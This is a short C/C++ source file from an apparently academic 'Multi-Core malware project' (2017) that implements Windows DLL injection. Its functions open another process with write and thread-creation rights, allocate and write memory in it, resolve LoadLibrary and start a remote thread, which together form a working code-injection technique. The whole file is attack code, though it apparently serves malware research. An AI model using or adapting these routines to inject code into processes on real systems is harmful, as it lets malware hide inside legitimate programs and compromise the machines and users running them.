/* Multi-Core malware project
 * Distributed DLL Injector Example
 * Marcus Botacin - 2017
 * Federal University of Paraná (UFPR)
 */

/* include block */
#include "functions.h"

/* implements DLL injection subroutines */

/* Open process handler */
HANDLE OPENPROC(int pid)
{
	HANDLE proc;
	proc= OpenProcess( 
 		PROCESS_QUERY_INFORMATION |
 		PROCESS_CREATE_THREAD     |
 		PROCESS_VM_OPERATION      |
		PROCESS_DUP_HANDLE |
 		PROCESS_VM_WRITE,          
 		TRUE, pid); 
	return proc;
}

/* Memory allocation */
LPVOID VIRTUALALLOC(HANDLE proc, int size)
{
	LPVOID alloc = VirtualAllocEx(proc, NULL, size, MEM_COMMIT, PAGE_READWRITE);
	return alloc;
}

/* Memory write */
BOOL WRITEPROC(HANDLE proc,LPVOID alloc,char *dll,int size)
{
	return WriteProcessMemory(proc, alloc, dll, size, NULL);
}

/* Locate module */
HMODULE GetModule()
{
		HMODULE k32 = GetModuleHandle(TEXT("Kernel32"));
		return k32;
}

/* Get thread start */
PTHREAD_START_ROUTINE GetThreadStart(HMODULE k32)
{
	PTHREAD_START_ROUTINE tStart = reinterpret_cast<PTHREAD_START_ROUTINE>(GetProcAddress(k32, LOAD_LIB));
	return tStart;
}

/* Create Thread */
HANDLE CreateThread(HANDLE proc,PTHREAD_START_ROUTINE tStart,LPVOID alloc)
{
	HANDLE t=CreateRemoteThread(proc,NULL,0,tStart,alloc, 0, NULL); 
	return t;
}